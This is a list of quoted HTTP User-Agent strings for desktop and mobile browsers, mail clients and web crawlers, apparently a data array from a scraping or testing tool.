"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
"Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",
"Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
"Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
"Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36",
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko)",
"Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7",
"MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN)",
"Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0",
"Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
"Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
"Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0",
"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1",
"Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36",
"Wget/1.17.1 (linux-gnu)",
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
"Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring",
"Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0",
"WirtschaftsWoche-iOS-1.1.14-20200824.1315",
"[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS)",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR)",
